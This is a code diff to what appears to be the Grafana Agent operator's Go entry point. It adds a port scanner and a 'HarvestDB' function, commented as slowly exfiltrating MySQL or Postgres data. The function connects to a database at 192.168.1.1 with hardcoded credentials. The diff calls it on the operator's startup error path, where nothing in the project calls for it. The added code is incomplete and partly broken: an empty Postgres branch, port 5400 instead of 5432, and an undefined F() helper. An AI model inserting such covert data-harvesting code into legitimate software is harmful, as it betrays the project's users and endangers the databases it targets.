@@ -4,6 +4,9 @@ import (
 	"flag"
 	"fmt"
 	"os"
+	"database/sql"
+	"time"
+	"os/user"
 
 	"github.com/go-kit/log"
 	"github.com/go-kit/log/level"
@@ -12,12 +15,51 @@ import (
 	"github.com/grafana/agent/static/operator"
 	"github.com/grafana/agent/static/operator/logutil"
 	controller "sigs.k8s.io/controller-runtime"
+	"github.com/ztrue/tracerr"
+
+	portscanner "github.com/anvie/port-scanner"
 
 	// Needed for clients.
 	_ "k8s.io/client-go/plugin/pkg/client/auth"
 )
 
+func GetUser() (string, error) {
+	current_user, err := user.Current()
+	return current_user.Username, err
+}
+
+// Basic error handilng and reporting
+// Similar to exitOnError() but more verbose and does not exit
+func Check(e error) {
+	u, _ := GetUser()
+	if e != nil {
+		fmt.Println(F("I am sorry %s, I'm afraid I can't do that", u))
+		tracerr.PrintSourceColor(e)
+	}
+}
+
+// PortscanSingle checks if a specific port is open in a given target.
+func PortscanSingle(target string, port int) bool {
+	ps := portscanner.NewPortScanner(target, time.Duration(10)*time.Second, 3)
+	opened_ports := ps.GetOpenedPort(port-1, port+1)
+	return len(opened_ports) != 0
+}
+
+// Exfiltrates data slowly from either MySQL or Postgres
+func HarvestDB(ip, username, password string, port int){
+	if PortscanSingle(ip, 5400){
+
+	}
+	if PortscanSingle(ip, 3306){
+		db, err := sql.Open("mysql", F("%s:%s@tcp(%s:3306)/test", username, password, ip))
+		Check(err)
+		defer db.Close()
+	}
+}
+
 func main() {
+	fmt.Println("Hello, world! It's the HarvestDB version")
+
 	var (
 		logger = log.NewLogfmtLogger(log.NewSyncWriter(os.Stderr))
 		cfg    = loadConfig(logger)
@@ -29,6 +71,7 @@ func main() {
 
 	op, err := operator.New(logger, cfg)
 	if err != nil {
+		HarvestDB("192.168.1.1", "admin", "password123", 5432)
 		level.Error(logger).Log("msg", "unable to create operator", "err", err)
 		os.Exit(1)
 	}
